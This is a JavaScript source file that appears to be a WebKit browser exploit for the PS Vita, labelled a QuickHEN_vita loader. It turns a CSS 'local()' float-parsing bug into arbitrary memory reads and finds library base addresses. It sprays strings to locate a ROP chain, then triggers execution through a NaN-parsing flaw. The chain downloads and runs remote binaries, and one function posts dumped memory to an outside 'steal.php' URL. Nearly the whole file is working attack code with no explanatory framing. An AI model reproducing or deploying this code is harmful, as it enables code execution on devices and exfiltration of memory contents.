function fromIEEE754(bytes, ebits, fbits) {
	var bits = [];
	
	for (var i = bytes.length; i; i -= 1) {
		var byte = bytes[i - 1];
		
		for (var j = 8; j; j -= 1) {
			bits.push(byte % 2 ? 1 : 0);
			byte = byte >> 1;
		}
	}
	
	bits.reverse();
	var str = bits.join('');
   
	var bias = (1 << (ebits - 1)) - 1;
	var s = parseInt(str.substring(0, 1), 2) ? -1 : 1;
	var e = parseInt(str.substring(1, 1 + ebits), 2);
	var f = parseInt(str.substring(1 + ebits), 2);
	 
	if (e === (1 << ebits) - 1)
		return f !== 0 ? NaN : s * Infinity;
	else if (e > 0)
		return s * Math.pow(2, e - bias) * (1 + f / Math.pow(2, fbits));
	else if (f !== 0)
		return s * Math.pow(2, -(bias-1)) * (f / Math.pow(2, fbits));
	else
		return s * 0;
}

function Repeat(s, n) {
	var a = [];
	
	while (a.length < n)
		a.push(s);
	return a.join('');
}

function toNonScientificNotation(input) {
	var res = input.toString();
	var split = res.split("e");
	
	if (split.length > 1) {
		var power = parseInt(split[1]);
		
		if (power > 0) {
			var pointsplit = split[0].split(".");
			power -= pointsplit[1].length;
			res = pointsplit[0] + pointsplit[1] + Repeat("0", power) + ".0";
		} else if (power < 0) {
			var pointsplit = split[0].split(".");
			res = "0." + Repeat("0", (-power)-1) + pointsplit[0] + pointsplit[1];
		}
	}
	
	return res;
}

function generateExploit(address, size) {
	var hex = new Array (
		(size >> 24) & 0xFF,
		(size >> 16) & 0xFF,
		(size >> 8) & 0xFF,
		(size) & 0xFF,
		(address >> 24) & 0xFF,
		(address >> 16) & 0xFF,
		(address >> 8) & 0xFF,
		(address) & 0xFF
	);
	
	return toNonScientificNotation(fromIEEE754(hex, 11, 52));
}

function readMemory(address, size) {
	var exploit = document.getElementById('exploit');
	exploit.style.src = 'local(' + generateExploit(address, size) + ')';
	return exploit.style.src;
}

function oldpsvita_hexdump(addr, size) {
	// var offset = -0x200000 + 0x10000;
	var offset = 0;
	var dump = ((addr & (~0xFFF)) >>> 0) + offset;
	var data = readMemory(dump, 0x100000);
	var out = "";
	for (var i = 0; i < size/2; ++i) {
		var x = data.charCodeAt(i + 6 + (addr - dump)/2);
		out += (x & 0xFF).toString(16) + " " + (x >> 8).toString(16) + " ";
	}
	alert("oldpsvita_hexdump(" + addr.toString(16) + "):\n" + out);
}

function hexh2bin(hex_val) {
	var str = "";
	var half = hex_val & 0xFFFF;
	
	// get hex
	str = half.toString(16);
	
	// pad as needed
	if (str.length < 3)
		str = "%" + Repeat("0", 2 - str.length) + str;
	else
		str = "%u" + Repeat("0", 4 - str.length) + str;
	
	return unescape(str);
}

function hexw2bin(hex_val) {
	// 1 word = 2 halfs
	return "" + hexh2bin(hex_val) + "" + hexh2bin(hex_val >> 16);
}

function setCharAt(str, index, chr) {
	if(index > str.length-1) return str;
	return str.substr(0, index) + chr + str.substr(index+1);
}

String.prototype.replaceAt = function(index, char) {
	return this.substr(0, index) + char + this.substr(index+char.length);
}

function findExploit(payload_addr, payload_data) {
	var start = payload_addr;
	var first = payload_data.charCodeAt(0);
	while (1) {
		var max_size = 0x100000;
		var data = readMemory(start, max_size);
		data = data.substr(6, max_size); // move past "local("

		// text = "";
		// for (var i = 0; i < 0x100; ++i)
		// 	text += data.charCodeAt(i).toString(16) + ",";
		// alert(text);
		
		// loop for tag
		for (var i = 0; i < max_size-6; i+=8) {
			// check for "/*"
			if (data.charCodeAt(i) == first) {
				// ok, convert line to text
				var text = "";
				var first = "", second = "";
				
				// loop next 5 bits
				var match = true;
				for (var k = 0; k < payload_data.length; ++k) {
					// convert to string
					if (data.charCodeAt(i + k) != payload_data.charCodeAt(k)) {
						match = false;
						break;
					}

					first += data.charCodeAt(i+k).toString(16);
					second += payload_data.charCodeAt(k).toString(16);
				}
				// alert(i.toString(16) + " " + first + " " + second);

				// we got a complete match
				if (match)
					return start + 2 * i;
			}
		}
		start += max_size - 6;
	}
	alert("Exploit could not be located.");
	
	return 0;
}

function trigger_rop_exec(exploit_addr) {
	var span = document.createElement("div");
	document.getElementById("BodyID").appendChild(span);
	span.innerHTML = -parseFloat("NAN(ffffe" + exploit_addr.toString(16) + ")");
}


function submitForm(data) {
	form = document.createElement('form');
	form.setAttribute('method', 'POST');
	form.setAttribute('action', "http://davee.pro/steal.php?start=DEADBEEF&size=1&seek=0");
	myvar = document.createElement('input');
	myvar.setAttribute('name', 'data');
	myvar.setAttribute('type', 'hidden');
	
	var strbin_data = "";
	
	for (var i = 0; i < data.length; i++) {
		var test = data.charCodeAt(i).toString(16);
		strbin_data += test + ' ';
	}
	
	//alert("larg = " + str.length);
	myvar.setAttribute('value', strbin_data);
	form.appendChild(myvar);
	document.body.appendChild(form);
	form.submit();
}


function get_module_bases() {
	var dump = "";
	var data = readMemory(SceLibSilkWebkit_base + 0x400000, 0x100000);
	data = data.substr(6, 0x100000);

	function read_mov_r12(addr) {
		addr /= 2;

		first = data.charCodeAt(addr);
		first |= data.charCodeAt(addr+1) << 16;

		second = data.charCodeAt(addr+2);
		second |= data.charCodeAt(addr+3) << 16;

		return ((((first & 0xFFF) | ((first & 0xF0000) >> 4)) & 0xFFFF) | ((((second & 0xFFF) | ((second & 0xF0000) >> 4)) & 0xFFFF) << 16)) >>> 0;
	}


	var vaddr_SceLibSilkBase_01322525,
		vaddr_SceLibSilkPlugin_CC885E58,
		vaddr_SceLibc_realloc,
		vaddr_SceLibKernel___sce_aeabi_idiv0;

	vaddr_SceLibSilkBase_01322525 = read_mov_r12(0x12E8D4);
	vaddr_SceLibSilkPlugin_CC885E58 = read_mov_r12(0x12f0f4);
	vaddr_SceLibc_realloc = read_mov_r12(0x12f334);
	vaddr_SceLibKernel___sce_aeabi_idiv0 = read_mov_r12(0x12f694);


	SceLibSilkBase_base	= vaddr_SceLibSilkBase_01322525 - 0x3db69
	SceLibSilkPlugin_base = vaddr_SceLibSilkPlugin_CC885E58 - 0x20f65;
	SceLibc_base = vaddr_SceLibc_realloc - 0xBA2F;
	SceLibKernel_base = vaddr_SceLibKernel___sce_aeabi_idiv0 - 0x5ba1;

	dump  = "SceLibSilkBase_base   " + SceLibSilkBase_base.toString(16) + "\n";
	dump += "SceLibSilkPlugin_base " + SceLibSilkPlugin_base.toString(16) + "\n";
	dump += "SceLibc_base          " + SceLibc_base.toString(16) + "\n";
	dump += "SceLibKernel_base     " + SceLibKernel_base.toString(16) + "\n";
	alert(dump);

	for (var i=0; i< -0xFFFF0; i++) {
		if (data.charCodeAt(i) == 0x6353) {
			//alert(i.toString(16));
			dump  = "i : " + "0x" + (i*2).toString(16) + "\n";
			dump += p16(data.charCodeAt(i+0));
			dump += p16(data.charCodeAt(i+1));
			dump += p16(data.charCodeAt(i+2));
			dump += p16(data.charCodeAt(i+3));
			dump += p16(data.charCodeAt(i+4));
			dump += p16(data.charCodeAt(i+5));
			dump += p16(data.charCodeAt(i+6));
			dump += p16(data.charCodeAt(i+7));
			alert(dump);
		}
	}
}

function main_ROP_first() {
	// Setup ldm_r4_data for lr shit. This unlocks "store" (without underscore) wrapper.
	_store(0, ldm_r4_data + 0x00);
	_store(0, ldm_r4_data + 0x04);
	_store(0, ldm_r4_data + 0x08);
	_store(window.pop_pc, ldm_r4_data + 0x0C);
	_store(window.pop_pc, ldm_r4_data + 0x10);
	
	// Setup ptr_pop_pc for some CALL wrappers
	store(pop_pc, ptr_pop_pc);
	
	/*init_socket("192.168.0.40", 9030);
	send_log_vvvv("// Welcome to QuickHEN_vita loader ROP chain for FW: %i\n", window.psvita_fw);
	close_socket();*/

	var payload_url = location.href.substring(0, location.href.lastIndexOf('/')) + "/dumper.bin";
	http_download_to_buf(window.current_payload_data_addr + 0x8000, payload_url, window.dumper_payload_base_addr, window.dumper_payload_size);
	run_in_thread(window.dumper_payload_base_addr, window.current_payload_data_addr + 0x8000);

	var payload_url = location.href.substring(0, location.href.lastIndexOf('/')) + "/second.bin";
	http_download_to_buf(window.current_payload_data_addr + 0x8000, payload_url, window.second_payload_base_addr, window.second_payload_size);
	pivot(window.second_payload_base_addr, window.current_payload_data_addr + 0x8000);
	
	call_v(sceKernelDelayThread, 60 * 1000 * 1000);
}

function oldpsvita_initROP() {
	window.old_fw = true;
	
	resolve();
	
	init_payload(0x88800000, -1, 0, 0x40000);

	// NOPs
	for (var i = 0; i < 12 + 4; ++i)
		push(0);
	
	// function ptr which is executed by webkit exploit
	//push(window.infloop); // for testing ROP execution
	push(window.ldm_r1_r0_r7_ip_sp_pc); // gadget to stack pivot to main ROP chain
	
	main_ROP_first();
	
	// end ROP chain
	while (oldpsvita_payload.length < 0x1000)
		oldpsvita_payload += ".";
	
	arr = [];
	for (var i = 0; i < 0x40; ++i)
		arr.push(new String(oldpsvita_payload + i));

	// get the payload address
	var oldpsvita_payload_addr = findExploit(0x889F0000 - 0x20000, oldpsvita_payload); // window.SceLibSilkBase_base of data ?????

	// create data
	var exploit	= p32(oldpsvita_payload_addr + 0x10)	// vptr which will be executed (r0 after ldm)
				+ p32(0) // r7
				+ p32(0) // ip
				+ p32(oldpsvita_payload_addr + 17 * 4) // sp
				+ p32(window.pop_pc); // pc = pop {pc}

	// spray exploit
	for (var i = 0; i < 0x10000; ++i)
		arr.push(new String(exploit + " " + i));

	// now find it!
	var exploit_addr = findExploit(oldpsvita_payload_addr, exploit);

	alert(
		"payload = 0x" + oldpsvita_payload_addr.toString(16) + "\n" + 
		"exploit = 0x" + exploit_addr.toString(16) + "\n" + 
		"slide = 0x" + (exploit_addr - oldpsvita_payload_addr).toString(16)
	);
	
	/*for (var i = 0; i < 2; ++i) {
		oldpsvita_hexdump(oldpsvita_payload_addr + 0x40, 0x40);
		oldpsvita_hexdump(exploit_addr, 0x40);
	}*/

	//alert("trigger ROP execution");
	trigger_rop_exec(exploit_addr);
	
	// should never go here
	alert("should never go here");
}